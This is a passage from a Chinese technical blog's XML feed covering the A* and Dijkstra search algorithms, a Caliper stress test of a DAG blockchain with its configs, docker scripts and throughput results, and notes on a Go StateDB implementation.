src="https://cdn.nlark.com/yuque/0/2021/svg/1629942/1620723691035-98fc7aa9-f863-4712-bac3-8f57411585e6.svg#clientId=u4512e8b3-315c-4&from=paste&height=13&id=u28f910d0&originHeight=26&originWidth=40&originalType=url%E2%88%B6=1&status=done&style=none&taskId=uabd98f3e-5132-480c-8650-2d94afd29b4&width=20">的定义，Dijkstra 算的<img src="https://cdn.nlark.com/yuque/0/2021/svg/1629942/1620723691113-2bf1da8e-b611-4885-a7f1-04164c40d237.svg#clientId=u4512e8b3-315c-4&from=paste&height=13&id=ubf3cbf54&originHeight=26&originWidth=40&originalType=url%E2%88%B6=1&status=done&style=none&taskId=ufbbe61e2-28bc-45d0-b633-061774a7863&width=20">定义为：<br><img src="https://cdn.nlark.com/yuque/0/2021/svg/1629942/1620723690976-e13b0e8b-3665-4557-aa0b-fc331ea832ac.svg#clientId=u4512e8b3-315c-4&from=paste&height=13&id=uc782ed82&originHeight=26&originWidth=107&originalType=url%E2%88%B6=1&status=done&style=none&taskId=u79b0ef1e-5762-4b77-8b5b-162e6ba7aa0&width=53.5"><br>其中<img src="https://cdn.nlark.com/yuque/0/2021/svg/1629942/1620723690991-a4dc7fa7-b40f-4515-b86e-7febdfd73f37.svg#clientId=u4512e8b3-315c-4&from=paste&height=13&id=u4bc7f663&originHeight=26&originWidth=39&originalType=url%E2%88%B6=1&status=done&style=none&taskId=u82673318-68cb-422c-b8b2-88439071c0e&width=19.5">表示<strong>从起点到当前点的移动代价</strong>。<br>作者：鬼木士链接：<a href="https://zhuanlan.zhihu.com/p/346666812%E6%9D%A5%E6%BA%90%EF%BC%9A%E7%9F%A5%E4%B9%8E%E8%91%97%E4%BD%9C%E6%9D%83%E5%BD%92%E4%BD%9C%E8%80%85%E6%89%80%E6%9C%89%E3%80%82%E5%95%86%E4%B8%9A%E8%BD%AC%E8%BD%BD%E8%AF%B7%E8%81%94%E7%B3%BB%E4%BD%9C%E8%80%85%E8%8E%B7%E5%BE%97%E6%8E%88%E6%9D%83%EF%BC%8C%E9%9D%9E%E5%95%86%E4%B8%9A%E8%BD%AC%E8%BD%BD%E8%AF%B7%E6%B3%A8%E6%98%8E%E5%87%BA%E5%A4%84%E3%80%82">https://zhuanlan.zhihu.com/p/346666812来源：知乎著作权归作者所有。商业转载请联系作者获得授权，非商业转载请注明出处。</a><br>以下图为例，计算起点 a 到终点 i 的最短路径，箭头上的数值表示<strong>两个节点间的距离</strong><br><img src="https://cdn.nlark.com/yuque/0/2021/jpg/1629942/1620724804748-4a3d83d3-6926-40e9-8f4a-4ea1e6eb2ab7.jpg#clientId=u4512e8b3-315c-4&from=paste&height=138&id=uce92bbd0&originHeight=275&originWidth=369&originalType=url%E2%88%B6=1&status=done&style=none&taskId=u1b2110ca-eadb-4f25-8e5d-d5865274f54&width=184.5"><br>首先扩展第一个节点，计算其余节点与第一个节点的距离，用橙色标出已经扩展的节点，未扩展的节点仍用绿色标出，其中圆中的数值表示<strong>该节点的代价函数</strong>，字母则表示该节点没有直接到达此时已扩展节点的路径。从未扩展的节点(绿色节点)中选择代价函数最小的节点进行拓展，并更新其余节点的代价函数，如下图<br><img src="https://cdn.nlark.com/yuque/0/2021/jpg/1629942/1620724805003-ce3a5327-f8f6-4234-8b68-f551b57fad52.jpg#clientId=u4512e8b3-315c-4&from=paste&height=137&id=uc0f1683a&originHeight=274&originWidth=1124&originalType=url%E2%88%B6=1&status=done&style=none&taskId=u8a1450f1-79f9-4399-8f8d-e169c2c3ede&width=562"><br>重复进行上面的步骤，直到所有节点都已扩展。<br><img src="https://cdn.nlark.com/yuque/0/2021/jpeg/1629942/1620724805459-58af2210-5c5e-485b-97f6-bae4c72cae59.jpeg#clientId=u4512e8b3-315c-4&from=paste&height=270&id=u45e4071d&originHeight=539&originWidth=720&originalType=url%E2%88%B6=1&status=done&style=none&taskId=ud51a5969-c955-4e39-8e84-4a846498db9&width=360"><br>最后标出起点到终点的最短路径<br><img src="https://cdn.nlark.com/yuque/0/2021/png/1629942/1620724804882-a19ebe6b-dd20-4e44-af25-05fac26e15de.png#clientId=u4512e8b3-315c-4&from=paste&height=137&id=u56f0c87f&originHeight=274&originWidth=369&originalType=url%E2%88%B6=1&status=done&style=none&taskId=ua013e2b8-7911-432c-a37e-57920b0aa19&width=184.5"></p><h2 id="A-算法"><a href="#A-算法" class="headerlink" title="A*算法"></a>A*算法</h2><p>对比 GBFS 和 Dijkstra 算法，两者都采用优先队列作为 openlist，而代价函数的不同导致两者具有不同的优点：GBFS 用节点到目标点的距离作为代价函数，将搜索方向引向目标点，搜索效率高；而 Dijkstra 算法采用起点到当前扩展节点的移动代价作为代价函数，能够确保路径最优。<br>那么可不可以将两者的代价函数进行融合，从而<strong>在保证路径最优的同时提高搜索效率</strong>？答案是肯定的，融合后的算法就是<strong>A*算法</strong>。<br>A<em>算法也是一种启发式算法，它的代价函数表示为：<br><img src="https://cdn.nlark.com/yuque/0/2021/svg/1629942/1620725031590-864b17ab-6299-418c-bc94-bd0486529dba.svg#clientId=u4512e8b3-315c-4&from=paste&height=13&id=u5a11f40f&originHeight=26&originWidth=174&originalType=url%E2%88%B6=1&status=done&style=none&taskId=u6444210b-d148-4737-8444-6e7a899159f&width=87"><br>其中 <img src="https://cdn.nlark.com/yuque/0/2021/svg/1629942/1620725031612-4bb2e537-3a2a-43f0-9430-720081543412.svg#clientId=u4512e8b3-315c-4&from=paste&height=13&id=ua1c55913&originHeight=26&originWidth=39&originalType=url%E2%88%B6=1&status=done&style=none&taskId=u81437d7e-75f3-4519-8ad2-3f4d8947340&width=19.5"> 为起点到当前扩展节点的移动代价函数， <img src="https://cdn.nlark.com/yuque/0/2021/svg/1629942/1620725031588-880c54fd-53e9-4a32-ae42-9b033a83bcc7.svg#clientId=u4512e8b3-315c-4&from=paste&height=13&id=u2774a467&originHeight=26&originWidth=41&originalType=url%E2%88%B6=1&status=done&style=none&taskId=u26212a94-ede6-4884-b185-f79bf3560b3&width=20.5"> 是启发函数，用节点到目标点的距离函数来表示。<br>根据这个式子，可以得到 A</em>算法的几个特点：</p><ul><li>如果令 <img src="https://cdn.nlark.com/yuque/0/2021/svg/1629942/1620725031585-3ccd0531-4927-431f-bb82-79cc2f0029e8.svg#clientId=u4512e8b3-315c-4&from=paste&height=13&id=u734ded48&originHeight=26&originWidth=79&originalType=url%E2%88%B6=1&status=done&style=none&taskId=u1854bd03-0452-47f9-9cb0-a773eb37eb7&width=39.5"> ，A<em>算法就退化为 Dijkstra 算法；如果令 <img src="https://cdn.nlark.com/yuque/0/2021/svg/1629942/1620725031585-161dbbd5-4e20-44d9-b575-43d61c553747.svg#clientId=u4512e8b3-315c-4&from=paste&height=13&id=u1cba9235&originHeight=26&originWidth=77&originalType=url%E2%88%B6=1&status=done&style=none&taskId=u1149f333-b9a7-4bf2-a3f1-b93cd429b0c&width=38.5">_，_A</em>算法就退化为 GBFS 算法。</li><li>能否找到最优路径的关键是启发函数 <img src="https://cdn.nlark.com/yuque/0/2021/svg/1629942/1620725036315-f0c86fa9-aa76-4298-a880-bf792907b269.svg#clientId=u4512e8b3-315c-4&from=paste&height=13&id=u2e57cf76&originHeight=26&originWidth=41&originalType=url%E2%88%B6=1&status=done&style=none&taskId=u2548ee5d-b15d-4954-9fe6-004bffcb214&width=20.5"> 的选取，如果 <img src="https://cdn.nlark.com/yuque/0/2021/svg/1629942/1620725036325-3ea21fc5-28b7-4eca-8740-e12dce2238c8.svg#clientId=u4512e8b3-315c-4&from=paste&height=13&id=u7c5a7978&originHeight=26&originWidth=41&originalType=url%E2%88%B6=1&status=done&style=none&taskId=u0f640d4a-3324-49b1-8fee-a3ec3ce5d3e&width=20.5"> 在大部分情况下比从当前节点到目标点的移动代价小，则能找到最优路径。</li><li>由于 A* 算法的启发函数是位置上的距离，因此在不带位置信息的图数据中不适用。</li></ul>]]></content>
      
      
      <categories>
          
          <category> 算法 </category>
          
          <category> 图论 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 图搜索算法 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>区块链性能测试</title>
      <link href="/2021/%E5%8C%BA%E5%9D%97%E9%93%BE%E6%80%A7%E8%83%BD%E6%B5%8B%E8%AF%95/"/>
      <url>/2021/%E5%8C%BA%E5%9D%97%E9%93%BE%E6%80%A7%E8%83%BD%E6%B5%8B%E8%AF%95/</url>
      
        <content type="html"><![CDATA[<p>对区块链进行性能测试</p><a id="more"></a><h1 id="现状"><a href="#现状" class="headerlink" title="现状"></a>现状</h1><p>目前，主流平台基本支持 Caliper 压力测试。<br>官方文档：<br>【1】<a href="https://fisco-bcos-documentation.readthedocs.io/zh_CN/latest/docs/articles/4_tools/46_stresstest/caliper_stress_test_practice.html">性能压测工具 Caliper 在 FISCO BCOS 平台中的实践</a><br>【2】<a href="https://fisco-bcos-documentation.readthedocs.io/zh_CN/latest/docs/tutorial/stress_testing.html#caliper">通过 Caliper 进行压力测试程序</a><br>其他个人业务 demo：<br>【1】<a href="https://blog.csdn.net/manok/article/details/82084852">基于区块链技术的性能测试</a><br>【2】<a href="https://bbs.huaweicloud.com/blogs/204653">基于 Fabric 的性能测试与调优实践</a><br>【3】<a href="https://www.infoq.cn/article/block-chain-practice">区块链性能测评实战案例</a></p><p>其他 web 服务器测压思路比如，Apachebench，redisbench，wrk</p><h1 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h1><ol><li>网络配置</li><li>设备配置</li><li>redis 截图<ol><li>查询性能</li><li>共识性能</li></ol></li><li>见本子</li></ol><h1 id="网络配置"><a href="#网络配置" class="headerlink" title="网络配置"></a>网络配置</h1><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><code class="hljs json">&#123;<br>  <span class="hljs-attr">&quot;test&quot;</span>: &#123;<br>    <span class="hljs-attr">&quot;blockchain&quot;</span>: <span class="hljs-string">&quot;block-dag&quot;</span>,<br>    <span class="hljs-attr">&quot;command&quot;</span>: &#123;<br>      <span class="hljs-attr">&quot;start&quot;</span>: <span class="hljs-string">&quot;sh block-dag/stress-testing/start.sh&quot;</span>,<br>      <span class="hljs-attr">&quot;end&quot;</span>: <span class="hljs-string">&quot;sh block-dag/stress-testing/end.sh&quot;</span><br>    &#125;<br>  &#125;,<br>  <span class="hljs-attr">&quot;minner&quot;</span>: &#123;<br>    <span class="hljs-attr">&quot;config&quot;</span>: &#123;<br>      <span class="hljs-attr">&quot;privateKey&quot;</span>: <span class="hljs-string">&quot;bcec428d5205abe0f0cc8a734083908d9eb8563e31f943d760786edf42ad67dd&quot;</span>,<br>      <span class="hljs-attr">&quot;account&quot;</span>: <span class="hljs-string">&quot;0x64fa644d2a694681bd6addd6c5e36cccd8dcdde3&quot;</span><br>    &#125;,<br>    <span class="hljs-attr">&quot;network&quot;</span>: &#123;<br>      <span class="hljs-attr">&quot;nodes&quot;</span>: [<br>        &#123;<br>          <span class="hljs-attr">&quot;ip&quot;</span>: <span class="hljs-string">&quot;192.168.1.1&quot;</span>,<br>          <span class="hljs-attr">&quot;rpcPort&quot;</span>: <span class="hljs-string">&quot;6001&quot;</span>,<br>          <span class="hljs-attr">&quot;channelPort&quot;</span>: <span class="hljs-string">&quot;9001&quot;</span><br>        &#125;,<br>        &#123;<br>          <span class="hljs-attr">&quot;ip&quot;</span>: <span class="hljs-string">&quot;192.168.1.2&quot;</span>,<br>          <span class="hljs-attr">&quot;rpcPort&quot;</span>: <span class="hljs-string">&quot;6001&quot;</span>,<br>          <span class="hljs-attr">&quot;channelPort&quot;</span>: <span class="hljs-string">&quot;9001&quot;</span><br>        &#125;,<br>        &#123;<br>          <span class="hljs-attr">&quot;ip&quot;</span>: <span class="hljs-string">&quot;192.168.1.3&quot;</span>,<br>          <span class="hljs-attr">&quot;rpcPort&quot;</span>: <span class="hljs-string">&quot;6001&quot;</span>,<br>          <span class="hljs-attr">&quot;channelPort&quot;</span>: <span class="hljs-string">&quot;9001&quot;</span><br>        &#125;<br>      ],<br>      <span class="hljs-attr">&quot;authentication&quot;</span>: &#123;<br>        <span class="hljs-attr">&quot;key&quot;</span>: <span class="hljs-string">&quot;block-dag/stress-testing/sdk/node.key&quot;</span>,<br>        <span class="hljs-attr">&quot;cert&quot;</span>: <span class="hljs-string">&quot;block-dag/stress-testing/sdk/node.crt&quot;</span>,<br>        <span class="hljs-attr">&quot;ca&quot;</span>: <span class="hljs-string">&quot;block-dag/stress-testing/sdk/ca.crt&quot;</span><br>      &#125;,<br>      <span class="hljs-attr">&quot;timeout&quot;</span>: <span class="hljs-number">900000</span><br>    &#125;<br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><strong>command.start</strong><br>首先执行 start 配置中指定的命令，主要用于使用 Docker 模式启动，启动 Caliper 时首先执行当前目录下的 start.sh 文件，其具体内容是：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs shell">docker -H 192.168.1.1:6001 run -d --rm --name node0 -v /data/test/node0/:/data -p 8000:8000 -p 20914:20914 -p 9001:9001 -w=/data dag/blockdag:latest -c config.ini 1&gt; /dev/null<br>docker -H 192.168.1.2:6001 run -d --rm --name node1 -v /data/test/node0/:/data -p 8000:8000 -p 20914:20914 -p 9001:9001 -w=/data dag/blockdag:latest -c config.ini 1&gt; /dev/null<br>docker -H 192.168.1.3:6001 run -d --rm --name node2 -v /data/test/node0/:/data -p 8000:8000 -p 20914:20914 -p 9001:9001 -w=/data dag/blockdag:latest -c config.ini 1&gt; /dev/null<br></code></pre></td></tr></table></figure><p>即启动远程的 Docker 容器。<br><strong>command.end</strong><br>Caliper 在退出流程的最后会执行 end 配置指定的命令，主要用于清理环境。本例中在测试结束时会执行当前目录下的 end.sh 文件，其具体内容是：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs shell">docker -H 192.168.1.1:6001 stop $(docker -H 192.168.1.1:6001 ps -a | grep node0 | cut -d &quot; &quot; -f 1) 1&gt; /dev/null &amp;&amp; echo -e &quot;\033[32mremote container node0 stopped\033[0m&quot;<br>docker -H 192.168.1.2:6001 stop $(docker -H 192.168.1.2:6001 ps -a | grep node1 | cut -d &quot; &quot; -f 1) 1&gt; /dev/null &amp;&amp; echo -e &quot;\033[32mremote container node1 stopped\033[0m&quot;<br>docker -H 192.168.1.3:6001 stop $(docker -H 192.168.1.3:6001 ps -a | grep node2 | cut -d &quot; &quot; -f 1) 1&gt; /dev/null &amp;&amp; echo -e &quot;\033[32mremote container node2 stopped\033[0m&quot;<br></code></pre></td></tr></table></figure><p>即停止并删除有所的远程容器。<br><strong>network.nodes</strong><br>一个包含了所有要连接节点的列表，列表中每一项需要指明被连接节点的 IP 地址、RPC 端口及 Channel 端口号，所有端口号需要和节点的配置文件保持一致。<br><strong>network.authentication</strong><br>适配器向节点的 Channel 端口发起请求时需要使用 CA 根证书等文件，这些文件已在 3.1.2 节中调用 build_chain.sh 脚本时已经生成好，使用任一节点配置下的 sdk 文件夹中的相应文件即可，需要在该配置中写上所有文件的路径。</p><h1 id="测试配置"><a href="#测试配置" class="headerlink" title="测试配置"></a>测试配置</h1><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-meta">---</span><br><span class="hljs-attr">test:</span><br>  <span class="hljs-attr">name:</span> <span class="hljs-string">stress</span> <span class="hljs-string">test</span><br>  <span class="hljs-attr">description:</span> <span class="hljs-string">This</span> <span class="hljs-string">is</span> <span class="hljs-string">a</span> <span class="hljs-string">stress</span> <span class="hljs-string">testing</span> <span class="hljs-string">of</span> <span class="hljs-string">Block</span> <span class="hljs-string">DAG.</span><br>  <span class="hljs-attr">clients:</span><br>    <span class="hljs-attr">type:</span> <span class="hljs-string">local</span><br>    <span class="hljs-attr">number:</span> <span class="hljs-number">1</span><br>  <span class="hljs-attr">rounds:</span><br>    <span class="hljs-bullet">-</span> <span class="hljs-attr">label:</span> <span class="hljs-string">create</span><br>      <span class="hljs-attr">description:</span> <span class="hljs-string">Test</span> <span class="hljs-string">performance</span> <span class="hljs-string">of</span> <span class="hljs-string">creating</span> <span class="hljs-string">txs</span><br>      <span class="hljs-attr">txNumber:</span><br>        <span class="hljs-bullet">-</span> <span class="hljs-number">15000</span><br>      <span class="hljs-attr">callback:</span> <span class="hljs-string">block-dag/stress-testing/create.js</span><br><span class="hljs-attr">monitor:</span><br>  <span class="hljs-attr">type:</span><br>    <span class="hljs-bullet">-</span> <span class="hljs-string">docker</span><br>  <span class="hljs-attr">docker:</span><br>    <span class="hljs-attr">name:</span><br>      <span class="hljs-bullet">-</span> <span class="hljs-string">http://192.168.1.1:6001</span><br>      <span class="hljs-bullet">-</span> <span class="hljs-string">http://192.168.1.2:6001</span><br>      <span class="hljs-bullet">-</span> <span class="hljs-string">http://192.168.1.3:6001</span><br>  <span class="hljs-attr">interval:</span> <span class="hljs-number">0.1</span><br></code></pre></td></tr></table></figure><p>测试文件中主要包括两部分：</p><ul><li>测试内容配置</li></ul><p>test 项负责对测试内容进行配置。配置主要集中在 round 字段中指定如何对区块链系统进行测试。每一个测试可以包含多轮，每一轮可以向区块链发起不同的测试请求。<br>本次测试是对系统的 createTx 接口进行测试。在测试中，可以通过 txNumber 字段指定测试的交易发送数量</p><ul><li>性能监视器配置</li></ul><p>monitor 项负责对测试所使用的性能监视器的进行配置。每项配置项的解释如下：</p><ol><li>monitor.type，需要指定为 docker，指对 docker 容器进行监控；</li><li>monitor.docker.name，一个包含所有要监视的节点的 docker 容器名称列表；</li><li>monitor.interval，监视器的采样间隔，单位为秒。</li></ol><h1 id="实际测试"><a href="#实际测试" class="headerlink" title="实际测试"></a>实际测试</h1><p>实际测试中，我选择类似 Apache 的测试结果。<br>全是正常交易</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-attr">Tx Length:</span> <span class="hljs-number">217088</span> <span class="hljs-string">bytes</span>       <span class="hljs-string">交易数据的长度</span><br><span class="hljs-attr">Total Txs Number:</span> <span class="hljs-number">15000</span><br><span class="hljs-attr">Time taken for tests:</span> <span class="hljs-number">5.919</span> <span class="hljs-string">seconds</span>    <span class="hljs-string">所有这些交易发送完所花费的时间</span><br><span class="hljs-attr">Complete requests:</span> <span class="hljs-number">15000</span>             <span class="hljs-string">完成请求数</span><br><span class="hljs-attr">Failed requests:</span> <span class="hljs-number">0</span>                <span class="hljs-string">失败请求数</span><br><span class="hljs-attr">Write errors:</span> <span class="hljs-number">0</span><br><span class="hljs-attr">Total transferred:</span> <span class="hljs-number">3256320000</span> <span class="hljs-string">bytes</span>     <span class="hljs-string">网络总传输量</span><br><span class="hljs-attr">TPS:</span> <span class="hljs-number">2536.3</span> [<span class="hljs-comment">#/sec] (mean) 吞吐量-每秒交易数</span><br><span class="hljs-attr">Time per request:</span> <span class="hljs-number">1.513</span> [<span class="hljs-string">ms</span>] <span class="hljs-string">(mean</span>, <span class="hljs-string">across</span> <span class="hljs-string">all</span> <span class="hljs-string">concurrent</span> <span class="hljs-string">requests)</span> <span class="hljs-string">并发的每个请求平均消耗时间</span><br><span class="hljs-attr">Transfer rate:</span> <span class="hljs-number">67.15</span> [<span class="hljs-string">Mbytes/sec</span>] <span class="hljs-string">received</span> <span class="hljs-string">平均每秒网络上的流量，可以帮助排除是否存在网络流量过大导致响应时间延长的问题</span><br></code></pre></td></tr></table></figure><p>说明:<br>Tx 长度为 212 kb，换算为字节是 217088 bytes</p><blockquote><p>用 nodejs 打印上述结果</p></blockquote><p><img src="https://cdn.nlark.com/yuque/0/2021/png/1629942/1620459896573-bc102c81-8f17-4d17-8074-ed6b671202b6.png#clientId=ue0d8159d-8879-4&from=paste&height=269&id=uf8e241e5&name=image.png&originHeight=538&originWidth=854&originalType=binary&size=66022&status=done&style=none&taskId=ua2f5d267-1fbc-46ce-a75d-7e48fa43834&width=427" alt="image.png"><br>打印区块<br>getMaxHeightBlock 接口–最高块<br><img src="https://cdn.nlark.com/yuque/0/2021/png/1629942/1620459806102-0d9e7147-7520-4e4a-984b-6913ce16a29a.png#clientId=ue0d8159d-8879-4&from=paste&height=302&id=udab02a53&name=image.png&originHeight=599&originWidth=978&originalType=binary&size=115789&status=done&style=none&taskId=u2ed02707-9654-4dfb-8fb5-77517ad6a23&width=493" alt="image.png"><br><img src="https://cdn.nlark.com/yuque/0/2021/png/1629942/1620459831877-92adbe62-3c59-4774-8194-003d3b1f038c.png#clientId=ue0d8159d-8879-4&from=paste&height=348&id=ubdbcfa19&name=image.png&originHeight=679&originWidth=909&originalType=binary&size=108543&status=done&style=none&taskId=u82ff9afe-2c69-4356-9d50-5d83d492427&width=465.5" alt="image.png"><br>这里注意到，每个块包含 60 个交易，60*95=5700&gt;3000（为平均每节点分配到的交易量），这里存在几种原因：<br>① 在并发生成块的时候，由于节点间的速率差异与网络延迟而导致当时观察到的 Tip 集不同，而导致的区块高度高于预期高度。<br>② 由于处理交易的时候对于放在交易缓存池中的未打包交易进行转发操作，并标记为未打包，导致其中的一些交易被不同的节点重复打包，而导致打包交易量大于预期。</p><p>解释各个字段的含义</p><p>再通过 rpc 端口查询每个节点中各自存储的交易量<br>（发送 GET 请求到 channel 端口进行查询）</p><p><img src="https://cdn.nlark.com/yuque/0/2021/png/1629942/1620467777427-c7a640ff-cbe0-4240-918e-4deec9c57b5d.png#clientId=ue0d8159d-8879-4&from=paste&height=85&id=u7c0e6c3b&name=image.png&originHeight=169&originWidth=808&originalType=binary&size=23484&status=done&style=none&taskId=u8db7b66d-e3cc-446c-ae3b-7416ee176a8&width=404" alt="image.png"><br><img src="https://cdn.nlark.com/yuque/0/2021/png/1629942/1620467714988-278e8c2b-682d-4885-9e8e-cdd02a853dd3.png#clientId=ue0d8159d-8879-4&from=paste&height=81&id=ud52b21b6&name=image.png&originHeight=162&originWidth=812&originalType=binary&size=23217&status=done&style=none&taskId=u0c59e8b2-326d-4414-b250-f3334c30c2e&width=406" alt="image.png"><br><img src="https://cdn.nlark.com/yuque/0/2021/png/1629942/1620467650231-6929499a-0112-425e-9104-58d587523544.png#clientId=ue0d8159d-8879-4&from=paste&height=85&id=ue659a490&name=image.png&originHeight=169&originWidth=805&originalType=binary&size=24212&status=done&style=none&taskId=u667e9356-a241-4ac0-9ab5-3676f248e40&width=402.5" alt="image.png"></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>区块链底层-状态机StateDB</title>
      <link href="/2021/%E5%8C%BA%E5%9D%97%E9%93%BE%E5%BA%95%E5%B1%82-%E7%8A%B6%E6%80%81%E6%9C%BAStateDB/"/>
      <url>/2021/%E5%8C%BA%E5%9D%97%E9%93%BE%E5%BA%95%E5%B1%82-%E7%8A%B6%E6%80%81%E6%9C%BAStateDB/</url>
      
        <content type="html"><![CDATA[<a id="more"></a><h1 id="全局"><a href="#全局" class="headerlink" title="全局"></a>全局</h1><p><img src="https://cdn.nlark.com/yuque/0/2021/png/1629942/1620032334655-cae41343-4469-4e98-8487-8743491bf5f4.png#clientId=u1d1d90de-5c3e-4&from=paste&height=344&id=ub777611d&name=image.png&originHeight=688&originWidth=1306&originalType=binary&size=308117&status=done&style=none&taskId=u950bfa17-cd9c-4cde-b1d9-eb903342901&width=653" alt="image.png"><br><img src="https://cdn.nlark.com/yuque/0/2021/png/1629942/1620044974426-9a7f13aa-86f6-4206-9cef-74b9cdf360e4.png#clientId=u1d1d90de-5c3e-4&from=paste&height=200&id=u4a6a08ef&name=image.png&originHeight=399&originWidth=969&originalType=binary&size=146076&status=done&style=none&taskId=ude525437-624d-4812-952f-2b51a1576ff&width=484.5" alt="image.png"></p><h1 id="创建状态树"><a href="#创建状态树" class="headerlink" title="创建状态树"></a>创建状态树</h1><p>状态数据库的定义如下：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">type</span> StateDB <span class="hljs-keyword">struct</span> &#123;<br>db   Database  <span class="hljs-comment">//操作状态的底层数据库，在实例化 StateDB 时指定 ②。</span><br>trie trie.Trie <span class="hljs-comment">//世界状态所在的树实例对象</span><br>stateObjects      <span class="hljs-keyword">map</span>[account.Address]*account.StateObject <span class="hljs-comment">//已账户地址为键的账户状态对象，能够在内存中维护使用过的账户</span><br>stateObjectsDirty <span class="hljs-keyword">map</span>[account.Address]<span class="hljs-keyword">struct</span>&#123;&#125;<span class="hljs-comment">//标记被修改过的账户</span><br>    dbErr  error<br>lock sync.Mutex<br>&#125;<br></code></pre></td></tr></table></figure><p>首先，</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs go">db: = state.NewDatabase(levelDB)<br>statedb, err := state.New(block.Root(), db)<br></code></pre></td></tr></table></figure><p>这里的 New 函数为：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-comment">//state/statedb.go:27</span><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">New</span><span class="hljs-params">(root hash.Hash, db Database)</span> <span class="hljs-params">(*StateDB, error)</span></span> &#123;<br>tr, err := db.OpenTrie(root)<span class="hljs-comment">//打开指定状态版本(root)的含世界状态的顶层树</span><br><span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br><span class="hljs-keyword">return</span> <span class="hljs-literal">nil</span>, err<br>&#125;<br><span class="hljs-keyword">return</span> &amp;StateDB&#123;<br>db:                db,<span class="hljs-comment">//②</span><br>trie:              tr,<br>stateObjects:      <span class="hljs-built_in">make</span>(<span class="hljs-keyword">map</span>[account.Address]*stateObject),<br>        stateObjectsDirty: <span class="hljs-built_in">make</span>(<span class="hljs-keyword">map</span>[account.Address]<span class="hljs-keyword">struct</span>&#123;&#125;),<br>preimages:         <span class="hljs-built_in">make</span>(<span class="hljs-keyword">map</span>[hash.Hash][]<span class="hljs-keyword">byte</span>),<br>journal:           newJournal(),<br>&#125;, <span class="hljs-literal">nil</span><br>&#125;<br></code></pre></td></tr></table></figure><p>世界态中的所有状态都是已账户为基础单位存在的，因此为了便于账户隔离管理，使用不开放的 stateObject 来维护某个账户下的状态。</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">type</span> StateObject <span class="hljs-keyword">struct</span> &#123;<br><span class="hljs-comment">//账户哈希</span><br>addrHash <span class="hljs-keyword">string</span><br>data     User <span class="hljs-comment">//账户属性</span><br><span class="hljs-comment">//底层数据库</span><br>db *state.StateDB<br><span class="hljs-comment">// 写缓存</span><br>trie Trie <span class="hljs-comment">// 存储树，第一次访问时初始化</span><br>&#125;<br><span class="hljs-keyword">type</span> User <span class="hljs-keyword">struct</span> &#123;<br><span class="hljs-comment">//账户地址</span><br>Address []<span class="hljs-keyword">byte</span><br><span class="hljs-comment">//账户余额</span><br>Amount <span class="hljs-keyword">float64</span><br><span class="hljs-comment">//交易个数</span><br>Nonce <span class="hljs-keyword">uint64</span><br><span 